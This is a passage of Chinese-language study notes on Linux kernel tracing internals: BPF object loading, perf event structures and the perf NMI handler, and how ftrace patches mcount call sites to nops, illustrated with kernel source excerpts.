		rm -rf *.o loader
	
	


- 二进制分析：readelf -S trace_kprobe_kern.o

.. code-block:: c
	:caption: trace_kprobe_kern.o二进制信息
	:linenos:	
	
	root@rachel:/usr/src/bpf_trace_kprobe_demo# readelf -a trace_kprobe_kern.o
	ELF 头：
	  Magic：  7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
	  类别:                              ELF64
	  数据:                              2 补码，小端序 (little endian)
	  Version:                           1 (current)
	  OS/ABI:                            UNIX - System V
	  ABI 版本:                          0
	  类型:                              REL (可重定位文件)
	  系统架构:                          Linux BPF
	  版本:                              0x1
	  入口点地址：              0x0
	  程序头起点：              0 (bytes into file)
	  Start of section headers:          616 (bytes into file)
	  标志：             0x0
	  Size of this header:               64 (bytes)
	  Size of program headers:           0 (bytes)
	  Number of program headers:         0
	  Size of section headers:           64 (bytes)
	  Number of section headers:         9
	  Section header string table index: 1

	节头：
	  [号] 名称              类型             地址              偏移量
	       大小              全体大小          旗标   链接   信息   对齐
	  [ 0]                   NULL             0000000000000000  00000000
	       0000000000000000  0000000000000000           0     0     0
	  [ 1] .strtab           STRTAB           0000000000000000  000001d3
	       0000000000000095  0000000000000000           0     0     1
	  [ 2] .text             PROGBITS         0000000000000000  00000040
	       0000000000000000  0000000000000000  AX       0     0     4
	  [ 3] tracepoint/s[...] PROGBITS         0000000000000000  00000040
	       0000000000000060  0000000000000000  AX       0     0     8
	  [ 4] kprobe/begin[...] PROGBITS         0000000000000000  000000a0
	       0000000000000098  0000000000000000  AX       0     0     8
	  [ 5] .rodata.str1.1    PROGBITS         0000000000000000  00000138
	       000000000000001b  0000000000000001 AMS       0     0     1
	  [ 6] license           PROGBITS         0000000000000000  00000153
	       0000000000000004  0000000000000000  WA       0     0     1
	  [ 7] .llvm_addrsig     LOOS+0xfff4c03   0000000000000000  000001d0
	       0000000000000003  0000000000000000   E       8     0     1
	  [ 8] .symtab           SYMTAB           0000000000000000  00000158
	       0000000000000078  0000000000000018           1     2     8
	Key to Flags:
	  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
	  L (link order), O (extra OS processing required), G (group), T (TLS),
	  C (compressed), x (unknown), o (OS specific), E (exclude),
	  D (mbind), p (processor specific)

	There are no section groups in this file.

运行load的过程就是函数将编译好的BPF程序中需要的节分离出来通过bpf系统调用加载到内核，内核将分离出来的BPF二进制代码加载到BPF虚拟机中进行执行。整个过程并没有伴随内核模块的加载。

总结
*****
- 这部分跟kprobe,livepatch的最大不同就是hook处跳到了bpf虚拟机中执行。整个加载过程通过系统调用实现，没有内核模块的加载过程；
- bpf部分调用的内核函数被严格控制；
- 下一步根据实验一步步补充。

perf
""""""""""""
perf的原理为每隔一个固定的时间，就在CPU上（每个核上都有）产生一个中断（PMI），在中断上处理程序中记录pid，及运行函数，然后给对应的pid和函数加一个统计值，这样，我们就知道CPU有百分几的时间在某个pid，或者某个函数上。

- 硬件上perf中断时产生NMI类型的中断：perf_events_lapic_init(void);
- 处理句柄：register_nmi_handler(NMI_LOCAL,perf_event_nmi_handler);


.. code-block:: c
	:caption: perf_event_nmi_handler:perf中断处理
	:linenos:

	static int perf_event_nmi_handler(unsigned int cmd, struct pt_regs *regs)
	{
		u64 start_clock;
		u64 finish_clock;
		int ret;

		/*
		 * All PMUs/events that share this PMI handler should make sure to
		 * increment active_events for their events.
		 */
		if (!atomic_read(&active_events))
			return NMI_DONE;

		start_clock = sched_clock();
		ret = static_call(x86_pmu_handle_irq)(regs);
		finish_clock = sched_clock();

		perf_sample_event_took(finish_clock - start_clock);/*采样花费时间 */

		return ret;
	}
	NOKPROBE_SYMBOL(perf_event_nmi_handler);			
	
	int x86_pmu_handle_irq(struct pt_regs *regs)
	{
		struct perf_sample_data data;
		struct cpu_hw_events *cpuc;
		struct perf_event *event;
		int idx, handled = 0;
		u64 val;

		cpuc = this_cpu_ptr(&cpu_hw_events);

		/*
		 * Some chipsets need to unmask the LVTPC in a particular spot
		 * inside the nmi handler.  As a result, the unmasking was pushed
		 * into all the nmi handlers.
		 *
		 * This generic handler doesn't seem to have any issues where the
		 * unmasking occurs so it was left at the top.
		 */
		apic_write(APIC_LVTPC, APIC_DM_NMI);

		for (idx = 0; idx < x86_pmu.num_counters; idx++) {
			if (!test_bit(idx, cpuc->active_mask))
				continue;

			event = cpuc->events[idx];

			val = x86_perf_event_update(event);
			if (val & (1ULL << (x86_pmu.cntval_bits - 1)))
				continue;

			/*
			 * event overflow
			 */
			handled++;
			perf_sample_data_init(&data, 0, event->hw.last_period);

			if (!x86_perf_event_set_period(event))
				continue;

			if (perf_event_overflow(event, &data, regs))
				x86_pmu_stop(event, 0);
		}

		if (handled)
			inc_irq_stat(apic_perf_irqs);

		return handled;
	}

perf比起ftrace来说，最大的好处是它可以直接跟踪到整个系统的所有程序（而不仅仅是内核），所以perf通常是我们分析的第一步，我们先看到整个系统的outline，然后才会进去看具体的调度，时延等问题。而且perf本身也告诉你调度是否正常了，比如内核调度子系统的函数占用率特别高，我们可能就知道我们需要分析一下调度过程了。

perf软件
***************************

- 


.. code-block:: c
	:caption: perf_event_init()初始化
	:linenos:

	/*
	 * Run the perf reboot notifier at the very last possible moment so that
	 * the generic watchdog code runs as long as possible.
	 */
	static struct notifier_block perf_reboot_notifier = {
		.notifier_call = perf_reboot,
		.priority = INT_MIN,
	};

	void __init perf_event_init(void)
	{
		int ret;

		idr_init(&pmu_idr);

		perf_event_init_all_cpus();
		init_srcu_struct(&pmus_srcu);
		perf_pmu_register(&perf_swevent, "software", PERF_TYPE_SOFTWARE);
		perf_pmu_register(&perf_cpu_clock, NULL, -1);
		perf_pmu_register(&perf_task_clock, NULL, -1);
		perf_tp_register();
		perf_event_init_cpu(smp_processor_id());
		register_reboot_notifier(&perf_reboot_notifier);

		ret = init_hw_breakpoint();
		WARN(ret, "hw_breakpoint initialization failed with: %d", ret);

		perf_event_cache = KMEM_CACHE(perf_event, SLAB_PANIC);

		/*
		 * Build time assertion that we keep the data_head at the intended
		 * location.  IOW, validation we got the __reserved[] size right.
		 */
		BUILD_BUG_ON((offsetof(struct perf_event_mmap_page, data_head))
			     != 1024);
	}

- 总线初始化
	
	.. code-block:: c
		:caption: pmu_bus初始化
		:linenos:
		
		static int pmu_bus_running;
		static struct bus_type pmu_bus = {
			.name		= "event_source",
			.dev_groups	= pmu_dev_groups,
		};
		
		static int __init perf_event_sysfs_init(void)
		{
			struct pmu *pmu;
			int ret;

			mutex_lock(&pmus_lock);

			ret = bus_register(&pmu_bus);
			if (ret)
				goto unlock;

			list_for_each_entry(pmu, &pmus, entry) {
				if (!pmu->name || pmu->type < 0)
					continue;

				ret = pmu_dev_alloc(pmu);
				WARN(ret, "Failed to register pmu: %s, reason %d\n", pmu->name, ret);
			}
			pmu_bus_running = 1;
			ret = 0;

		unlock:
			mutex_unlock(&pmus_lock);

			return ret;
		}
		device_initcall(perf_event_sysfs_init);
		
	
对应总线名为"event_source"。



perf硬件基础
***********
- arch:x86
intel 64 和IA-32架构提供通过PMU（性能监控单元）实现的性能监控特性。从Pentium 处理器开始引入性能监控，这个单元由一组特定模式性能监控寄存器（MSRs)组成.这些计数器允许选择要监视和测量的处理器性能参数。 从这些计数器获得的信息可用于调整系统和编译器性能。在 Intel P6 系列处理器中，性能监控机制得到了增强，允许监控更广泛的事件选择，并允许监控更多的控制事件。 接下来，基于英特尔 NetBurst 微架构的英特尔处理器引入了分布式风格的性能监控机制和性能事件。为基于 Intel NetBurst 微体系结构的 Pentium、P6 系列和 Intel 处理器定义的性能监控机制和性能事件不是体系结构。 它们都是特定于模型的（处理器系列之间不兼容）。 Intel Core Solo 和 Intel Core Duo 处理器支持一组架构性能事件和一组非架构性能事件。 较新的英特尔处理器支持增强的架构性能事件和非架构性能事件。

从 Intel Core Solo 和 Intel Core Duo 处理器开始，有两类性能监控功能。 第一类支持使用计数或基于中断的事件采样来监控性能的事件。 这些事件是非体系结构的，并且因处理器型号而异。 它们类似于 Pentium M 处理器中可用的那些。 这些非架构性能监控事件是特定于微架构的，并且可能随着增强而改变。
第二类性能监视功能称为架构性能监视。此类支持相同的计数和基于中断的事件采样用法，但可用事件集较少。 架构性能事件的可见行为在处理器实现中是一致的。架构性能监控功能的可用性使用 CPUID.0AH 进行枚举。

系统调用:perf_event_open
***********************

.. code-block:: c
	:caption: perf_event_open系统调用
	:linenos:
	
	/**
	 * sys_perf_event_open - open a performance event, associate it to a task/cpu
	 *
	 * @attr_uptr:	event_id type attributes for monitoring/sampling
	 * @pid:		target pid
	 * @cpu:		target cpu
	 * @group_fd:		group leader event fd
	 * @flags:		perf event open flags
	 */
	SYSCALL_DEFINE5(perf_event_open,
			struct perf_event_attr __user *, attr_uptr,
			pid_t, pid, int, cpu, int, group_fd, unsigned long, flags)
			
			
- 系统调用概述:设置性能监控,对 perf_event_open() 的调用会创建一个允许测量性能信息的文件描述符。 每个文件描述符对应一个被测量的事件； 这些可以组合在一起以同时测量多个事件。可以通过两种方式启用和禁用事件：通过 ioctl(2) 和通过 prctl(2)。 当一个事件被禁用时，它不会计数或产生溢出，但会继续存在并保持其计数值。事件有两种形式：计数和采样。 计数事件是用于对发生的事件总数进行计数的事件。 通常，计数事件结果是通过调用 read(2) 收集的。 采样事件定期将测量值写入缓冲区，然后可以通过 mmap(2) 访问该缓冲区。			
- 具体参考：https://www.man7.org/linux/man-pages/man2/perf_event_open.2.html		
			
perf 基础结构一：struct pmu {}
*****************************

.. code-block:: c
	:caption: struct pmu
	:linenos:
	
	/**
	 * struct pmu - generic performance monitoring unit
	 */
	struct pmu {
		struct list_head		entry;

		struct module			*module;
		struct device			*dev;
		const struct attribute_group	**attr_groups;
		const struct attribute_group	**attr_update;
		const char			*name;
		int				type;

		/*
		 * various common per-pmu feature flags
		 */
		int				capabilities;

		int __percpu			*pmu_disable_count;
		struct perf_cpu_context __percpu *pmu_cpu_context;
		atomic_t			exclusive_cnt; /* < 0: cpu; > 0: tsk */
		int				task_ctx_nr;
		int				hrtimer_interval_ms;

		/* number of address filters this PMU can do */
		unsigned int			nr_addr_filters;

		/*
		 * Fully disable/enable this PMU, can be used to protect from the PMI
		 * as well as for lazy/batch writing of the MSRs.
		 */
		void (*pmu_enable)		(struct pmu *pmu); /* optional */
		void (*pmu_disable)		(struct pmu *pmu); /* optional */

		/*
		 * Try and initialize the event for this PMU.
		 *
		 * Returns:
		 *  -ENOENT	-- @event is not for this PMU
		 *
		 *  -ENODEV	-- @event is for this PMU but PMU not present
		 *  -EBUSY	-- @event is for this PMU but PMU temporarily unavailable
		 *  -EINVAL	-- @event is for this PMU but @event is not valid
		 *  -EOPNOTSUPP -- @event is for this PMU, @event is valid, but not supported
		 *  -EACCES	-- @event is for this PMU, @event is valid, but no privileges
		 *
		 *  0		-- @event is for this PMU and valid
		 *
		 * Other error return values are allowed.
		 */
		int (*event_init)		(struct perf_event *event);

		/*
		 * Notification that the event was mapped or unmapped.  Called
		 * in the context of the mapping task.
		 */
		void (*event_mapped)		(struct perf_event *event, struct mm_struct *mm); /* optional */
		void (*event_unmapped)		(struct perf_event *event, struct mm_struct *mm); /* optional */

		/*
		 * Flags for ->add()/->del()/ ->start()/->stop(). There are
		 * matching hw_perf_event::state flags.
		 */
	#define PERF_EF_START	0x01		/* start the counter when adding    */
	#define PERF_EF_RELOAD	0x02		/* reload the counter when starting */
	#define PERF_EF_UPDATE	0x04		/* update the counter when stopping */

		/*
		 * Adds/Removes a counter to/from the PMU, can be done inside a
		 * transaction, see the ->*_txn() methods.
		 *
		 * The add/del callbacks will reserve all hardware resources required
		 * to service the event, this includes any counter constraint
		 * scheduling etc.
		 *
		 * Called with IRQs disabled and the PMU disabled on the CPU the event
		 * is on.
		 *
		 * ->add() called without PERF_EF_START should result in the same state
		 *  as ->add() followed by ->stop().
		 *
		 * ->del() must always PERF_EF_UPDATE stop an event. If it calls
		 *  ->stop() that must deal with already being stopped without
		 *  PERF_EF_UPDATE.
		 */
		int  (*add)			(struct perf_event *event, int flags);
		void (*del)			(struct perf_event *event, int flags);

		/*
		 * Starts/Stops a counter present on the PMU.
		 *
		 * The PMI handler should stop the counter when perf_event_overflow()
		 * returns !0. ->start() will be used to continue.
		 *
		 * Also used to change the sample period.
		 *
		 * Called with IRQs disabled and the PMU disabled on the CPU the event
		 * is on -- will be called from NMI context with the PMU generates
		 * NMIs.
		 *
		 * ->stop() with PERF_EF_UPDATE will read the counter and update
		 *  period/count values like ->read() would.
		 *
		 * ->start() with PERF_EF_RELOAD will reprogram the counter
		 *  value, must be preceded by a ->stop() with PERF_EF_UPDATE.
		 */
		void (*start)			(struct perf_event *event, int flags);
		void (*stop)			(struct perf_event *event, int flags);

		/*
		 * Updates the counter value of the event.
		 *
		 * For sampling capable PMUs this will also update the software period
		 * hw_perf_event::period_left field.
		 */
		void (*read)			(struct perf_event *event);

		/*
		 * Group events scheduling is treated as a transaction, add
		 * group events as a whole and perform one schedulability test.
		 * If the test fails, roll back the whole group
		 *
		 * Start the transaction, after this ->add() doesn't need to
		 * do schedulability tests.
		 *
		 * Optional.
		 */
		void (*start_txn)		(struct pmu *pmu, unsigned int txn_flags);
		/*
		 * If ->start_txn() disabled the ->add() schedulability test
		 * then ->commit_txn() is required to perform one. On success
		 * the transaction is closed. On error the transaction is kept
		 * open until ->cancel_txn() is called.
		 *
		 * Optional.
		 */
		int  (*commit_txn)		(struct pmu *pmu);
		/*
		 * Will cancel the transaction, assumes ->del() is called
		 * for each successful ->add() during the transaction.
		 *
		 * Optional.
		 */
		void (*cancel_txn)		(struct pmu *pmu);

		/*
		 * Will return the value for perf_event_mmap_page::index for this event,
		 * if no implementation is provided it will default to: event->hw.idx + 1.
		 */
		int (*event_idx)		(struct perf_event *event); /*optional */

		/*
		 * context-switches callback
		 */
		void (*sched_task)		(struct perf_event_context *ctx,
						bool sched_in);

		/*
		 * Kmem cache of PMU specific data
		 */
		struct kmem_cache		*task_ctx_cache;

		/*
		 * PMU specific parts of task perf event context (i.e. ctx->task_ctx_data)
		 * can be synchronized using this function. See Intel LBR callstack support
		 * implementation and Perf core context switch handling callbacks for usage
		 * examples.
		 */
		void (*swap_task_ctx)		(struct perf_event_context *prev,
						 struct perf_event_context *next);
						/* optional */

		/*
		 * Set up pmu-private data structures for an AUX area
		 */
		void *(*setup_aux)		(struct perf_event *event, void **pages,
						 int nr_pages, bool overwrite);
						/* optional */

		/*
		 * Free pmu-private AUX data structures
		 */
		void (*free_aux)		(void *aux); /* optional */

		/*
		 * Take a snapshot of the AUX buffer without touching the event
		 * state, so that preempting ->start()/->stop() callbacks does
		 * not interfere with their logic. Called in PMI context.
		 *
		 * Returns the size of AUX data copied to the output handle.
		 *
		 * Optional.
		 */
		long (*snapshot_aux)		(struct perf_event *event,
						 struct perf_output_handle *handle,
						 unsigned long size);

		/*
		 * Validate address range filters: make sure the HW supports the
		 * requested configuration and number of filters; return 0 if the
		 * supplied filters are valid, -errno otherwise.
		 *
		 * Runs in the context of the ioctl()ing process and is not serialized
		 * with the rest of the PMU callbacks.
		 */
		int (*addr_filters_validate)	(struct list_head *filters);
						/* optional */

		/*
		 * Synchronize address range filter configuration:
		 * translate hw-agnostic filters into hardware configuration in
		 * event::hw::addr_filters.
		 *
		 * Runs as a part of filter sync sequence that is done in ->start()
		 * callback by calling perf_event_addr_filters_sync().
		 *
		 * May (and should) traverse event::addr_filters::list, for which its
		 * caller provides necessary serialization.
		 */
		void (*addr_filters_sync)	(struct perf_event *event);
						/* optional */

		/*
		 * Check if event can be used for aux_output purposes for
		 * events of this PMU.
		 *
		 * Runs from perf_event_open(). Should return 0 for "no match"
		 * or non-zero for "match".
		 */
		int (*aux_output_match)		(struct perf_event *event);
						/* optional */

		/*
		 * Filter events for PMU-specific reasons.
		 */
		int (*filter_match)		(struct perf_event *event); /* optional */

		/*
		 * Check period value for PERF_EVENT_IOC_PERIOD ioctl.
		 */
		int (*check_period)		(struct perf_event *event, u64 value); /* optional */
	};

perf 基础结构二：struct perf_event {}
************************************
- perf_event结构：核心结构。


	.. code-block:: c
		:caption: struct perf_event {}
		:linenos:
			
		/**
		 * struct perf_event - performance event kernel representation:
		 */
		struct perf_event {
		#ifdef CONFIG_PERF_EVENTS
			/*
			 * entry onto perf_event_context::event_list;
			 *   modifications require ctx->lock
			 *   RCU safe iterations.
			 */
			struct list_head		event_entry;

			/*
			 * Locked for modification by both ctx->mutex and ctx->lock; holding
			 * either sufficies for read.
			 */
			struct list_head		sibling_list;
			struct list_head		active_list;
			/*
			 * Node on the pinned or flexible tree located at the event context;
			 */
			struct rb_node			group_node;
			u64				group_index;
			/*
			 * We need storage to track the entries in perf_pmu_migrate_context; we
			 * cannot use the event_entry because of RCU and we want to keep the
			 * group in tact which avoids us using the other two entries.
			 */
			struct list_head		migrate_entry;

			struct hlist_node		hlist_entry;
			struct list_head		active_entry;
			int				nr_siblings;

			/* Not serialized. Only written during event initialization. */
			int				event_caps;
			/* The cumulative AND of all event_caps for events in this group. */
			int				group_caps;

			struct perf_event		*group_leader;
			struct pmu			*pmu;
			void				*pmu_private;

			enum perf_event_state		state;
			unsigned int			attach_state;
			local64_t			count;
			atomic64_t			child_count;

			/*
			 * These are the total time in nanoseconds that the event
			 * has been enabled (i.e. eligible to run, and the task has
			 * been scheduled in, if this is a per-task event)
			 * and running (scheduled onto the CPU), respectively.
			 */
			u64				total_time_enabled;
			u64				total_time_running;
			u64				tstamp;

			/*
			 * timestamp shadows the actual context timing but it can
			 * be safely used in NMI interrupt context. It reflects the
			 * context time as it was when the event was last scheduled in,
			 * or when ctx_sched_in failed to schedule the event because we
			 * run out of PMC.
			 *
			 * ctx_time already accounts for ctx->timestamp. Therefore to
			 * compute ctx_time for a sample, simply add perf_clock().
			 */
			u64				shadow_ctx_time;

			struct perf_event_attr		attr;
			u16				header_size;
			u16				id_header_size;
			u16				read_size;
			struct hw_perf_event		hw;

			struct perf_event_context	*ctx;
			atomic_long_t			refcount;

			/*
			 * These accumulate total time (in nanoseconds) that children
			 * events have been enabled and running, respectively.
			 */
			atomic64_t			child_total_time_enabled;
			atomic64_t			child_total_time_running;

			/*
			 * Protect attach/detach and child_list:
			 */
			struct mutex			child_mutex;
			struct list_head		child_list;
			struct perf_event		*parent;

			int				oncpu;
			int				cpu;

			struct list_head		owner_entry;
			struct task_struct		*owner;

			/* mmap bits */
			struct mutex			mmap_mutex;
			atomic_t			mmap_count;

			struct perf_buffer		*rb;
			struct list_head		rb_entry;
			unsigned long			rcu_batches;
			int				rcu_pending;

			/* poll related */
			wait_queue_head_t		waitq;
			struct fasync_struct		*fasync;

			/* delayed work for NMIs and such */
			int				pending_wakeup;
			int				pending_kill;
			int				pending_disable;
			unsigned long			pending_addr;	/* SIGTRAP */
			struct irq_work			pending;

			atomic_t			event_limit;

			/* address range filters */
			struct perf_addr_filters_head	addr_filters;
			/* vma address array for file-based filders */
			struct perf_addr_filter_range	*addr_filter_ranges;
			unsigned long			addr_filters_gen;

			/* for aux_output events */
			struct perf_event		*aux_event;

			void (*destroy)(struct perf_event *);
			struct rcu_head			rcu_head;

			struct pid_namespace		*ns;
			u64				id;

			u64				(*clock)(void);
			perf_overflow_handler_t		overflow_handler;
			void				*overflow_handler_context;
		#ifdef CONFIG_BPF_SYSCALL
			perf_overflow_handler_t		orig_overflow_handler;
			struct bpf_prog			*prog;
		#endif

		#ifdef CONFIG_EVENT_TRACING
			struct trace_event_call		*tp_event;
			struct event_filter		*filter;
		#ifdef CONFIG_FUNCTION_TRACER
			struct ftrace_ops               ftrace_ops;
		#endif
		#endif

		#ifdef CONFIG_CGROUP_PERF
			struct perf_cgroup		*cgrp; /* cgroup event is attach to */
		#endif

		#ifdef CONFIG_SECURITY
			void *security;
		#endif
			struct list_head		sb_list;
		#endif /* CONFIG_PERF_EVENTS */
		};

- perf event函数总结：
  
  perf_event_xxxx();
  

perf 基础结构三：进程关联结构-struct perf_event_context {}
*******************************************************	
而对于task维度的perf_event来说只有在task得到调度运行的时候event才能运行。

- 与进程关联结构：

	.. code-block:: c
		:caption: struct perf_event_context
		:linenos:
			

		struct task_task {
			......
			#ifdef CONFIG_PERF_EVENTS
				struct perf_event_context	*perf_event_ctxp[perf_nr_task_contexts];
				struct mutex			perf_event_mutex;
				struct list_head		perf_event_list;
			#endif	
			......	
		}
		

		
		/**
		 * struct perf_event_context - event context structure
		 *
		 * Used as a container for task events and CPU events as well:
		 */
		struct perf_event_context {
			struct pmu			*pmu;
			/*
			 * Protect the states of the events in the list,
			 * nr_active, and the list:
			 */
			raw_spinlock_t			lock;
			/*
			 * Protect the list of events.  Locking either mutex or lock
			 * is sufficient to ensure the list doesn't change; to change
			 * the list you need to lock both the mutex and the spinlock.
			 */
			struct mutex			mutex;

			struct list_head		active_ctx_list;
			struct perf_event_groups	pinned_groups;
			struct perf_event_groups	flexible_groups;
			struct list_head		event_list;

			struct list_head		pinned_active;
			struct list_head		flexible_active;

			int				nr_events;
			int				nr_active;
			int				is_active;
			int				nr_stat;
			int				nr_freq;
			int				rotate_disable;
			/*
			 * Set when nr_events != nr_active, except tolerant to events not
			 * necessary to be active due to scheduling constraints, such as cgroups.
			 */
			int				rotate_necessary;
			refcount_t			refcount;
			struct task_struct		*task;

			/*
			 * Context clock, runs when context enabled.
			 */
			u64				time;
			u64				timestamp;

			/*
			 * These fields let us detect when two contexts have both
			 * been cloned (inherited) from a common ancestor.
			 */
			struct perf_event_context	*parent_ctx;
			u64				parent_gen;
			u64				generation;
			int				pin_count;
		#ifdef CONFIG_CGROUP_PERF
			int				nr_cgroups;	 /* cgroup evts */
		#endif
			void				*task_ctx_data; /* pmu specific data */
			struct rcu_head			rcu_head;
		};

- 进程相关部分函数：__perf_event_task_sched_out/in(prev,next):

	.. code-block:: c
		:caption: 针对进程的调用
		:linenos:

		_schedule():
			context_switch(rq,prev,next,&rf);
				prepare_task_switch(rq,prev,next);
					perf_event_task_sched_out(prev,next);
				......
				
				finish_task_switch(prev);
					perf_event_task_sched_in(prev,current);



	我们看perf_event_task_sched_out/in(prev,next) --> __perf_event_task_sched_out/in(prev,next):


	.. code-block:: c
		:caption: __perf_event_task_sched_out/in(prev,next)
		:linenos:		

		/*
		 * Called from scheduler to remove the events of the current task,
		 * with interrupts disabled.
		 *
		 * We stop each event and update the event value in event->count.
		 *
		 * This does not protect us against NMI, but disable()
		 * sets the disabled bit in the control field of event _before_
		 * accessing the event control register. If a NMI hits, then it will
		 * not restart the event.
		 */
		void __perf_event_task_sched_out(struct task_struct *task,
						 struct task_struct *next)
		{
			int ctxn;

			if (__this_cpu_read(perf_sched_cb_usages))
				perf_pmu_sched_task(task, next, false);

			if (atomic_read(&nr_switch_events))
				perf_event_switch(task, next, false);

			for_each_task_context_nr(ctxn)
				perf_event_context_sched_out(task, ctxn, next);

			/*
			 * if cgroup events exist on this CPU, then we need
			 * to check if we have to switch out PMU state.
			 * cgroup event are system-wide mode only
			 */
			if (atomic_read(this_cpu_ptr(&perf_cgroup_events)))
				perf_cgroup_sched_out(task, next);
		}		

		/*
		 * Called from scheduler to add the events of the current task
		 * with interrupts disabled.
		 *
		 * We restore the event value and then enable it.
		 *
		 * This does not protect us against NMI, but enable()
		 * sets the enabled bit in the control field of event _before_
		 * accessing the event control register. If a NMI hits, then it will
		 * keep the event running.
		 */
		void __perf_event_task_sched_in(struct task_struct *prev,
						struct task_struct *task)
		{
			struct perf_event_context *ctx;
			int ctxn;

			/*
			 * If cgroup events exist on this CPU, then we need to check if we have
			 * to switch in PMU state; cgroup event are system-wide mode only.
			 *
			 * Since cgroup events are CPU events, we must schedule these in before
			 * we schedule in the task events.
			 */
			if (atomic_read(this_cpu_ptr(&perf_cgroup_events)))
				perf_cgroup_sched_in(prev, task);

			for_each_task_context_nr(ctxn) {
				ctx = task->perf_event_ctxp[ctxn];
				if (likely(!ctx))
					continue;

				perf_event_context_sched_in(ctx, task);
			}

			if (atomic_read(&nr_switch_events))
				perf_event_switch(task, prev, true);

			if (__this_cpu_read(perf_sched_cb_usages))
				perf_pmu_sched_task(prev, task, true);
		}

- 进程相关部分函数： perf_event_task_migrate(p);
- 进程相关部分函数 perf_event_task_tick();


perf 基础结构三：struct perf_cpu_context {}
*********************************************		
对于cpu维度的perf_event来说只要cpu online会一直运行,每个cpu上同时只能有一个task维度的perf_evnt得到执行，cpu维度的context使用了pmu->pmu_cpu_context->task_ctx指针来保存当前运行的task context。

- 与CPU关联结构

.. code-block:: c
	:caption: struct perf_cpu_context
	:linenos:
			
	struct pmu {
		......
		struct perf_cpu_context __percpu *pmu_cpu_context;
		......
	}	
	/**
	 * struct perf_event_cpu_context - per cpu event context structure
	 */
	struct perf_cpu_context {
		struct perf_event_context	ctx;
		struct perf_event_context	*task_ctx;
		int				active_oncpu;
		int				exclusive;

		raw_spinlock_t			hrtimer_lock;
		struct hrtimer			hrtimer;
		ktime_t				hrtimer_interval;
		unsigned int			hrtimer_active;

	#ifdef CONFIG_CGROUP_PERF
		struct perf_cgroup		*cgrp;
		struct list_head		cgrp_cpuctx_entry;
	#endif

		struct list_head		sched_cb_entry;
		int				sched_cb_usage;

		int				online;
		/*
		 * Per-CPU storage for iterators used in visit_groups_merge. The default
		 * storage is of size 2 to hold the CPU and any CPU event iterators.
		 */
		int				heap_size;
		struct perf_event		**heap;
		struct perf_event		*heap_default[2];
	};

	struct pmu pmu;


	
总结
*****
- 理解：根据要测量的事件设置PMU寄存器，最后统计各种事件发生的概率；
- 下一步从细节上整理。			
			
			

linux kernel trace
"""""""""""""""""""

静态trace
**********




这是集大成的跟踪系统，此处主要分析其实现原理，以进行阶段性总结。

ftrace
********

Ftrace 是一个内部跟踪器，旨在帮助系统的开发人员和设计人员找到内核内部发生的事情。它可用于调试或分析发生在用户空间之外的延迟和性能问题。尽管 ftrace 通常被认为是函数跟踪器，但它实际上是一个包含多种跟踪实用程序的框架。有延迟跟踪来检查中断禁用和启用之间发生的情况，以及抢占和从任务被唤醒到任务实际被调度的时间。ftrace 最常见的用途之一是事件跟踪。在整个内核中，有数百个静态事件点可以通过 tracefs 文件系统启用，以查看内核某些部分发生了什么。
ftrace（函数跟踪）是内核跟踪的“瑞士军刀”。它是内建在Linux内核中的一种跟踪机制。它能深入内核去发现里面究竟发生了什么，并调试它。ftrace不只是一个函数跟踪工具，它的跟踪能力之强大，还能调试和分析诸如延迟、意外代码路径、性能问题等一大堆问题。它也是一种很好的学习工具。
https://www.cnblogs.com/jefree/p/4439013.html
实现原理：
1. 首先ftrace.c 文件注释为：infrastructure for profiling code inserted by 'gcc -pg'
2. mcount ==> nop

	.. code-block:: c
		:caption: ftrace基本结构
		:linenos:

		vmlinux.lds:mcount部分布局
		......
		__start_mcount_loc = .; KEEP(*(__mcount_loc)) KEEP(*(__patchable_function_entries)) __stop_mcount_loc = .;
		......
		
		struct dyn_ftrace {/* mcount每个地址初始化一个结构 */
			unsigned long		ip; /* address of mcount call-site */
			unsigned long		flags;
			struct dyn_arch_ftrace	arch;
		};

		struct ftrace_page {/*组织每个地址单元结构，每个内核模块插入后产生一个结构，以链表形式组织。 */
			struct ftrace_page	*next;
			struct dyn_ftrace	*records;
			int			index;
			int			order;
		};
		
		union text_poke_insn {
			u8 text[POKE_MAX_OPCODE_SIZE];
			struct {
				u8 opcode;
				s32 disp;
			} __attribute__((packed));
		};

		arch/x86/kernel/ftrace_64.S
		#ifdef CONFIG_DYNAMIC_FTRACE

		SYM_FUNC_START(__fentry__)
			retq
		SYM_FUNC_END(__fentry__)
		EXPORT_SYMBOL(__fentry__)
		....


		#define MCOUNT_ADDR ((unsigned long)(__fentry__)

	将内核的__start_mcount_loc/__stop_mcount_loc节初始化为struct ftrace_page结构，并将mcount初始化为struct dyn_ftrace列表。将ip指向的地址内容初始化为nop


	.. code-block:: c
		:caption: 内核__start_mcount_loc/__stop_mcount_loc节初始化
		:linenos:

		ftrace_init():
			ftrace_dyn_arch_init():/* 空  */
			count = __stop_mcount_loc - __start_mcount_loc;
			

			ftrace_process_locs(NULL,__start_mcount_loc,__stop_mcount_loc);
				构建：ftrace_process_locs: count * sizeof(struct dyn_ftrace)
				     struct ftrae_page:每个单元一个结构

				ftrace_call_adjust: return addr;
				
				初始化struct ftrace_page结构：根据mcount表（地址表）；
					     rec->ip = addr;
				
				ftrace_pages = pg;/* 初始化全局变量 */

				ftrace_update_code(NULL,struct ftrace_page *new_pgs)
					start = ftrace_now();
					ftrace_nop_initialize(struct module *mod,struct dyn_ftrace *rec)//循环替换，全部替换为nop
						ftrace_init_nop(mod,rec):
							ftrace_make_nop(mod,struct dyn_ftrace *rec,MCOUNT_ADD);
								old = ftrace_call_replace(rec->ip,addr);
									return text_gen_insn(CALL_INSN_OPCODE,(void *)ip,(void *)addr);
										static union text_poke_insn insn;
										insn.opcode = CALL_INSN_OPCODE;
										insn.disp = (long)dest - (long)(addr + size);
										return &insn.text;
													
								new = ftrace_nop_replace()		
									return x86_nops[5];
									
								ftrace_modify_code_direct(ip,old,new);
									ftrace_verify_code(ip,lod_code);//判断*ip 是否与 old相同；如果相同则继续；
									text_poke_early((void *)ip,new_code,MCOUNT_INSN_SIZE);//将地址中指令替换为nop
										void __init_or_module text_poke_early(void *addr,const void *opcode,size_t len)
											memcpy(addr,opcode,len);/* 指令替换 */			
											sync_code();

					
					stop = ftrace_now();
					ftrace_update_time = stop - start;
					strace_update_tot_cnt += update_cnt;
					
			set_ftrace_early_filters();	/*下一轮补上 */

	此时把所有mcount指向的地址中的指令替换为nop指令。

	我们看内核模块中的ftrace处理：


	.. code-block:: c
		:caption: 内核模块__mcount_loc节初始化
		:linenos:


		readelf -S livepatch_sample.ko
		.....
		  [ 6] __mcount_loc      PROGBITS         0000000000000000  00000117
